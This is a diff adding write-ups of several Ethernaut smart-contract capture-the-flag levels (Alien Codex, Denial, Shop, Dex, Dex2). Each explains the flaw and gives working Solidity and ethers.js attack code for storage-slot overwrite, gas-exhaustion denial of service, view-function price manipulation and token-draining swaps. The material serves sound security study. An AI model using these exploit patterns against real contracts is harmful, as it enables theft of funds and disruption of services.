@@ -485,5 +485,214 @@ Phew!
 
 ---
 
+## alien codex
+
+Goal is to become owner, which is slot `0x2` as `0x0` has the `bool` contact and `0x1` has the size of dynamic array. 
+
+Check out [Mappings and Dynamic Arrays](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#mappings-and-dynamic-arrays) for understanding on why size is stored and the upcoming reasonings
+
+Things to notics
+- solidity version is 0.5.0
+- `retract` is interesting. we can manipulate the size of dynamic array
+- `revise` has no checks. we can update any index of array
+
+Exploit works by triggering the `make_contact`, underflowing the length of array via `retract` and finally revising the slot storing owner. First 2 steps are stiaght forward, to find the storage location we need to understand the storage rules of dynamic array.
+
+First element will be stored in `keccack256(1)`, 1 being the slot number and rest all will be sequentially stored. After the storage is filled, storage index will roll up because of overflow
+
+```
+0x0           0x00000....01
+0x1           0x111111...11         <- size of array
+0x2           0x<owner_address>
+0x3           0x0000.....00
+0x4           0x0000.....00
+..
+..
+0x??          0x0000.....00         <- first element somewhere keccack(1) -
+0x??          0x0000.....00         <- second element                      |
+..                                                                         | number of elements + 2 is the location
+..                                                                         |
+0x111...11111 0x0000.....00         <- 2^256th slot                       -
+```
+
+To get the location we'll substract `0x11111..1111 - keccack(1)` location of first element and add `1`. Then simply trigger `revise`.
+
+```solidity
+contract AlienCodexHack {
+  AlienCodex  alienCodex;
+
+  constructor (address instance) public {
+    alienCodex = AlienCodex(instance);
+    alienCodex.make_contact();
+    alienCodex.retract();
+    uint256 MIN;
+    uint256 MAX = ~MIN;
+    uint256 loc = MAX - uint256(keccak256(abi.encode(1))) + 1;
+    alienCodex.revise(loc, bytes32(bytes20(address(msg.sender))) >> 96);
+  }
+}
+```
+```javascript
+const AlienCodexHack = await hre.ethers.getContractFactory("AlienCodexHack");
+const alienCodexHack = await AlienCodexHack.deploy(alienCodex.address)
+await alienCodexHack.deployed()
+console.log(await alienCodex.owner())
+```
+
+--- 
+
+## denial
+
+The goal is to render this contract unusable. 
+
+First thing to notice here is that we can set `partner` and there is not check that if `partner` is not a smart contract. This is can used later on. Moving on, there is no return value check after call `partner.call{value:amountToSend}("");` and it is a low level `call` which continues even after revert. So we can not simply revert the transaction.
+
+Only way is to run the tranasction out of gas everytime. There are multiple ways to do that
+
+```solidity
+contract DenialHack {
+
+    Denial denial;
+    constructor (address instance) {
+        denial = Denial(payable(instance));
+        denial.setWithdrawPartner(address(this));
+       
+    }
+    // allow deposit of funds
+    receive() external payable {
+        payable(address(denial)).call{value:msg.value}("");
+        denial.withdraw();
+    }
+}
+```
+
+```javascript
+const DenialHack = await hre.ethers.getContractFactory("DenialHack");
+const denialHack = await DenialHack.deploy(denial.address);
+await denialHack.deployed();
+```
+
+---
+
+## shop
+
+The goal is to set `price` different from what is defined in the contract after the sell. This challenge is very similar to the elevator challenge.
+
+We need to implement a `Buyer` contract which returns different prices on subsequent `price` calls. But since `price` is a view call, we can not change state in the Buyer like we did in elevator. We'll check `isSold` and manipulate prices basis on the value
+
+```solidity
+contract BuyerHack is Buyer {
+    Shop shop;
+
+    constructor(address instance) {
+        shop = Shop(instance);
+        
+    }
+
+    function buy() public {
+        shop.buy();
+    }
+
+    function price() public view returns (uint256) {
+        if (shop.isSold()) {
+            return 1;
+        }
+        return shop.price();
+    }
+}
+```
+
+```javascript
+const BuyerHack = await hre.ethers.getContractFactory("BuyerHack");
+const buyerHack = await BuyerHack.deploy(INSTANCE_ADDRESS);
+await buyerHack.deployed();
+const tx = await buyerHack.buy();
+```
+
+---
+
+## dex
+
+Goal is to drain 1 of the 2 tokens completely. After staring at the contract for a lot of time, I couldn't come up with any security flaw (solidity wise). I started triggering the swaps in the hope of finding out something new
+
+```javascript
+await token1.approve(dex.address, 10);
+tx = await dex.swap(token1.address, token2.address, 10);
+```
+and then it clicked!! there is no invariant on `getSwapPrice`, everytime you perform swaps the prices will skew. Doing this few times get you the desired result
+
+```javascript
+await token1.approve(dex.address, 10)
+tx = await dex.swap(token1.address, token2.address, 10);
+
+await token2.approve(dex.address, 20)
+tx = await dex.swap(token2.address, token1.address, 20);
+
+await token1.approve(dex.address, 24)
+tx = await dex.swap(token1.address, token2.address, 24);
+
+await token2.approve(dex.address, 30)
+tx = await dex.swap(token2.address, token1.address, 30);
+
+await token1.approve(dex.address, 41)
+tx = await dex.swap(token1.address, token2.address, 41);
+
+
+await token2.approve(dex.address, 45)
+tx = await dex.swap(token2.address, token1.address, 45);
+```
+
+## dex2
+
+The goal is here is to drain both the tokens. The difference between dex and dex2 is that there is no check for Invalid Tokens. This makes life easier.
+
+To clear this level we can deploy new token and manipulate prices to drain the actual tokens. 
+
+```solidity
+contract SwappableTokenTwoHack is ERC20 {
+  address private _dex;
+  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
+        _mint(msg.sender, initialSupply);
+        _dex = dexInstance;
+  }
+
+  function mint(uint256 amount) public {
+     _mint(msg.sender, amount);
+  }
+}
+```
+
+- deploy  `SwappableTokenTwoHack` and transfer 10 to dex and 10 to player initially
+- 
+
+```javascript
+let SwappableTokenTwoHack = await hre.ethers.getContractFactory("SwappableTokenTwoHack");
+
+SwappableToken = SwappableToken.connect(player)
+SwappableTokenTwoHack = SwappableTokenTwoHack.connect(player)
+let dummyToken = await SwappableTokenTwoHack.deploy(dex.address, "DM", "DM", 20);
+await dummyToken.deployed();
+
+dex = dex.connect(player)
+token1 = token1.connect(player)
+token2 = token2.connect(player)
+dummyToken = dummyToken.connect(player)
+
+tx = await dummyToken.transfer(dex.address, 10)
+await tx.wait()
+tx = await dummyToken.transfer(player.address, 10)
+await tx.wait()
+await (await dummyToken.approve(dex.address, 10)).wait()
+
+tx = await dex.swap(dummyToken.address, token2.address, 10);
+await tx.wait()
+
+await (await dummyToken.mint(20)).wait()
+await (await dummyToken.approve(dex.address, 20)).wait()
+
+tx = await dex.swap(dummyToken.address, token1.address, 20);
+await tx.wait()
+```
+
 
 
